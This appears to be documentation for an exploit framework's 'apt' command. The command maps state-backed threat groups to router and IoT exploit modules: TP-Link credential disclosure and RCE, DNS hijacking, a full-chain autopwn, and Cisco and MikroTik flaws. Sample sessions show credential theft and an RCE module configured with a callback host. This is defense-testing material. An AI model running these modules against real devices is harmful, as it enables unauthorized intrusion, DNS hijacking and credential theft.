# APT Catalog (`apt` Command)

**Language:** English (en-US) | **pt-BR:** [../pt-BR/17-catalogo-apt.md](../pt-BR/17-catalogo-apt.md)

---

## Overview

The `apt` command provides a threat-actor-centric view of the exploit catalog. It maps real-world Advanced Persistent Threat (APT) groups to the EmbedXPL modules that reproduce their attack techniques, allowing security teams to test their defenses against specific nation-state threat scenarios.

All groups target network devices: routers, switches, firewalls, VPN appliances, IP cameras, and IoT edge devices.

---

## Syntax

```
apt                         List all APT groups
apt list                    Same as above
apt show <group_id>         Show attack chain for a group
apt search <keyword>        Search groups by device or CVE
apt run <group_id>          Load the first attack module for a group
apt run <group_id> <index>  Load a specific attack by index number
```

---

## `apt` / `apt list` — list all groups

```
exf> apt

┌──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐
│                              APT Groups Targeting Network Devices (8)                                                                            │
├────────────────────┬──────────────────────────────┬──────────┬──────────────────────────────────────────────────────────┬─────────┬─────────────┤
│ ID                 │ Name                          │ Country  │ Aliases                                                  │ Attacks │ MITRE       │
├────────────────────┼──────────────────────────────┼──────────┼──────────────────────────────────────────────────────────┼─────────┼─────────────┤
│ apt28              │ APT28 / Forest Blizzard       │ Russia   │ Fancy Bear, Sofacy, Pawn Storm                          │   6     │ G0007       │
│ volt_typhoon       │ Volt Typhoon                  │ China    │ BRONZE SILHOUETTE, Vanguard Panda, DEV-0391             │   3     │ G1017       │
│ sandworm           │ Sandworm / APT44              │ Russia   │ Voodoo Bear, IRIDIUM, Electrum, Telebots                │   3     │ G0034       │
│ quad7              │ Quad7 / CovertNetwork-1658    │ China    │ 7777 Botnet, Storm-0940                                 │   2     │ C0055       │
│ turla              │ Turla                         │ Russia   │ Snake, Venomous Bear, Uroburos, Waterbug                │   2     │ G0010       │
│ lazarus            │ Lazarus Group                 │ N.Korea  │ HIDDEN COBRA, Guardians of Peace, APT38                │   2     │ G0032       │
│ muddywater         │ MuddyWater                    │ Iran     │ MERCURY, SeedWorm, TEMP.Zagros                          │   2     │ G0069       │
│ unc2452            │ UNC2452 / Cozy Bear           │ Russia   │ APT29, Midnight Blizzard, NOBELIUM                     │   2     │ G0016       │
└────────────────────┴──────────────────────────────┴──────────┴──────────────────────────────────────────────────────────┴─────────┴─────────────┘

[*] Use 'apt show <group_id>' for details or 'apt run <group_id>' to execute
```

---

## `apt show APT28` — attack chain detail

```
exf> apt show apt28

╔════════════════════════════════════════════════════════════════════════════════════╗
║  APT Profile: apt28                                                                ║
╠════════════════════════════════════════════════════════════════════════════════════╣
║  APT28 / Forest Blizzard (Russia)                                                  ║
║                                                                                    ║
║  Russian GRU Military Unit 26165. Since Aug 2025, exploits SOHO routers to        ║
║  hijack DNS and conduct AiTM attacks stealing Outlook/OAuth credentials.           ║
║  200+ orgs and 5,000+ devices compromised per Microsoft/NCSC (Apr 2026).          ║
╚════════════════════════════════════════════════════════════════════════════════════╝

┌───┬─────────────────────────────────┬───────────────────────────────────────────────────────────┬──────────────────────────────────────┬─────────────────────────────────────────────────────────────────────────┬──────────────────────────────────────────────────────────────┬──────┐
│ # │ Phase                           │ Attack                                                    │ CVEs                                 │ Modules                                                                 │ Devices                                                      │ Auth │
├───┼─────────────────────────────────┼───────────────────────────────────────────────────────────┼──────────────────────────────────────┼─────────────────────────────────────────────────────────────────────────┼──────────────────────────────────────────────────────────────┼──────┤
│ 0 │ Initial Access                  │ TP-Link WR841N Credential Disclosure                      │ CVE-2023-50224                       │ exploits/routers/tplink/wr841n_credential_disclosure_cve_2023_50224    │ TP-Link TL-WR841N                                            │ No   │
│ 1 │ Execution                       │ TP-Link Parental Control RCE                              │ CVE-2025-9377                        │ exploits/routers/tplink/wr841n_parental_control_rce_cve_2025_9377      │ TP-Link TL-WR841N                                            │ Yes  │
│ 2 │ Impact                          │ TP-Link DNS Hijack (20+ models)                           │ -                                    │ exploits/routers/tplink/multi_dns_hijack_apt28                          │ TP-Link Archer C5/C7, WDR3500/3600/4300, WR740N-WR941ND     │ Yes  │
│ 3 │ Impact                          │ MikroTik DNS Hijack                                       │ -                                    │ exploits/routers/mikrotik/routeros_dns_hijack_apt28                     │ MikroTik RouterOS                                            │ Yes  │
│ 4 │ Detection                       │ DNS Hijack Detection (defensive)                          │ -                                    │ generic/dns_hijack_detector                                             │ Any router/gateway                                           │ No   │
│ 5 │ Full Kill Chain                 │ Full Chain AutoPwn (CVE-2023-50224 + CVE-2025-9377)       │ CVE-2023-50224, CVE-2025-9377        │ exploits/routers/tplink/apt28_full_chain_autopwn                        │ TP-Link TL-WR841N                                            │ No   │
└───┴─────────────────────────────────┴───────────────────────────────────────────────────────────┴──────────────────────────────────────┴─────────────────────────────────────────────────────────────────────────┴──────────────────────────────────────────────────────────────┴──────┘

[*] Use 'apt run apt28 [attack#]' to execute
```

---

## `apt show volt_typhoon`

```
exf> apt show volt_typhoon

╔════════════════════════════════════════════════════════════════╗
║  APT Profile: volt_typhoon                                     ║
╠════════════════════════════════════════════════════════════════╣
║  Volt Typhoon (China)                                          ║
║                                                                ║
║  Chinese state-sponsored group targeting US critical           ║
║  infrastructure. Hijacks EOL SOHO routers (Cisco RV320/325,    ║
║  Netgear ProSafe) as proxy infrastructure for stealthy lateral  ║
║  movement into power grids and water systems. KV Botnet.       ║
╚════════════════════════════════════════════════════════════════╝

┌───┬─────────────────────┬───────────────────────────────────────┬──────────────────────────────────────────────┬───────────────────────────────────────────────────────────────────┬───────────────────────────────────────────┬──────┐
│ # │ Phase               │ Attack                                │ CVEs                                         │ Modules                                                           │ Devices                                   │ Auth │
├───┼─────────────────────┼───────────────────────────────────────┼──────────────────────────────────────────────┼───────────────────────────────────────────────────────────────────┼───────────────────────────────────────────┼──────┤
│ 0 │ Initial Access      │ Cisco RV320 Command Injection          │ CVE-2019-1652, CVE-2019-1653                 │ exploits/routers/cisco/rv320_command_injection                     │ Cisco RV320, Cisco RV325                  │ No   │
│   │                     │                                       │                                              │ exploits/routers/cisco/rv300_rv320_information_disclosure_cve_2019_1653│                                       │      │
│ 1 │ Initial Access      │ Netgear ProSafe Default Credentials    │ -                                            │ creds/routers/netgear/ssh_default_creds                           │ Netgear ProSafe series                    │ No   │
│   │                     │                                       │                                              │ creds/routers/netgear/telnet_default_creds                        │                                           │      │
│ 2 │ Credential Access   │ MikroTik Winbox Credential Disclosure  │ CVE-2018-14847                               │ exploits/routers/mikrotik/winbox_cred_disclosure_cve_2018_14847   │ MikroTik RouterOS < 6.42                  │ No   │
└───┴─────────────────────┴───────────────────────────────────────┴──────────────────────────────────────────────┴───────────────────────────────────────────────────────────────────┴───────────────────────────────────────────┴──────┘
```

---

## `apt show sandworm`

```
exf> apt show sandworm

╔════════════════════════════════════════════════════════════════════════════╗
║  APT Profile: sandworm                                                     ║
╠════════════════════════════════════════════════════════════════════════════╣
║  Sandworm / APT44 (Russia)                                                 ║
║                                                                            ║
║  Russian GRU Unit 74455. Known for destructive attacks (Ukraine power      ║
║  grid, NotPetya). Since 2022, pivoted to exploiting misconfigured edge     ║
║  devices (routers, VPNs). Cyclops Blink targeted ASUS/WatchGuard.         ║
╚════════════════════════════════════════════════════════════════════════════╝

┌───┬───────────────┬───────────────────────────────────────┬──────────────────┬──────────────────────────────────────────────────────────────────────────┬────────────────────────────────────────────────────────┬──────┐
│ # │ Phase         │ Attack                                │ CVEs             │ Modules                                                                  │ Devices                                                │ Auth │
├───┼───────────────┼───────────────────────────────────────┼──────────────────┼──────────────────────────────────────────────────────────────────────────┼────────────────────────────────────────────────────────┼──────┤
│ 0 │ Initial Access│ ASUS Router Exploitation (Cyclops Blink)│ -               │ creds/routers/asus/ssh_default_creds                                    │ ASUS RT-N16, RT-N66U, RT-AC66U                         │ No   │
│   │               │                                       │                  │ exploits/routers/asus/rt_n66u_remote_command_execution                   │                                                        │      │
│ 1 │ Initial Access│ Cisco SNMP RCE                        │ CVE-2017-6742    │ generic/snmp/snmp_bruteforce                                             │ Cisco IOS routers                                      │ No   │
│ 2 │ Persistence   │ MikroTik Router Jailbreak             │ -                │ exploits/routers/mikrotik/routeros_jailbreak                             │ MikroTik RouterOS                                      │ Yes  │
└───┴───────────────┴───────────────────────────────────────┴──────────────────┴──────────────────────────────────────────────────────────────────────────┴────────────────────────────────────────────────────────┴──────┘
```

---

## `apt search` — search by device or CVE

### Search by device keyword

```
exf> apt search tplink

[+] APT28 / Forest Blizzard (Russia) — 6 attacks
  -> TP-Link WR841N Credential Disclosure [CVE-2023-50224]
  -> TP-Link Parental Control RCE [CVE-2025-9377]
  -> TP-Link DNS Hijack (20+ models) [Impact]
[+] Quad7 / CovertNetwork-1658 (China) — 2 attacks
  -> TP-Link WR841N Exploit Chain [CVE-2023-50224, CVE-2025-9377]
```

### Search by CVE

```
exf> apt search CVE-2018-14847

[+] Volt Typhoon (China) — 3 attacks
  -> MikroTik Winbox Credential Disclosure [CVE-2018-14847]
```

### Search with no results

```
exf> apt search nonexistent_device

[*] No APT groups found for 'nonexistent_device'
```

### Missing keyword

```
exf> apt search

[-] Usage: apt search <device_or_cve>
```

---

## `apt run <group_id>` — load first attack module

`apt run` loads the first executable module in the group's attack chain and places it in the `current_module` context. The user then sets the target and runs the module interactively.

```
exf> apt run apt28

[*] [Initial Access] TP-Link WR841N Credential Disclosure — loading exploits/routers/tplink/wr841n_credential_disclosure_cve_2023_50224
[*] Module loaded. Set target and run with 'run' or 'check'

exf (tplink/wr841n_credential_disclosure_cve_2023_50224) > set target 192.168.1.1
[+] target => 192.168.1.1
exf (tplink/wr841n_credential_disclosure_cve_2023_50224) > run

[*] Running module embedxpl.modules.exploits.routers.tplink.wr841n_credential_disclosure_cve_2023_50224...
[*] Connecting to http://192.168.1.1:80/loginFs/...
[+] Credentials disclosed:
    Username: admin
    Password: admin123
[+] Authentication bypass successful via CVE-2023-50224
```

---

## `apt run <group_id> <attack_index>` — load specific attack

```
exf> apt run apt28 1

[*] [Execution] TP-Link Parental Control RCE — loading exploits/routers/tplink/wr841n_parental_control_rce_cve_2025_9377
[*] Module loaded. Set target and run with 'run' or 'check'

exf (tplink/wr841n_parental_control_rce_cve_2025_9377) > set target 192.168.1.1
[+] target => 192.168.1.1
exf (tplink/wr841n_parental_control_rce_cve_2025_9377) > set lhost 10.10.14.22
[+] lhost => 10.10.14.22
exf (tplink/wr841n_parental_control_rce_cve_2025_9377) > run
```

---

## `apt run` — attack with no executable module

Some attacks are detection/analysis techniques without exploit modules:

```
exf> apt run apt28 4

[*] Skipping 'DNS Hijack Detection' — no executable module
```

---

## Error cases

### Unknown group

```
exf> apt show unknown_group

[-] Unknown group: unknown_group

exf> apt run bad_group

[-] Unknown group: bad_group
```

### Invalid attack index

```
exf> apt run apt28 abc

[-] Attack index must be a number
```

### Unknown subcommand

```
exf> apt foo

[-] Unknown subcommand: foo. Use 'apt', 'apt list', 'apt show', 'apt search', 'apt run'
```

---

## APT group reference table

| Group ID | Name | Country | MITRE | Primary targets |
|----------|------|---------|-------|-----------------|
| `apt28` | APT28 / Forest Blizzard | Russia | G0007 | SOHO routers (TP-Link, MikroTik), DNS hijacking |
| `volt_typhoon` | Volt Typhoon | China | G1017 | Cisco RV320/325, Netgear ProSafe, MikroTik |
| `sandworm` | Sandworm / APT44 | Russia | G0034 | ASUS routers, Cisco IOS, MikroTik |
| `quad7` | Quad7 / CovertNetwork-1658 | China | C0055 | TP-Link, Zyxel, Ruckus, ASUS (botnet) |
| `turla` | Turla | Russia | G0010 | Ubiquiti EdgeRouters, reverse SSH tunnels |
| `lazarus` | Lazarus Group | North Korea | G0032 | Cisco, Juniper, financial sector routers |
| `muddywater` | MuddyWater | Iran | G0069 | Fortinet, Cisco, network perimeter |
| `unc2452` | UNC2452 / Cozy Bear | Russia | G0016 | SolarWinds, perimeter appliances |
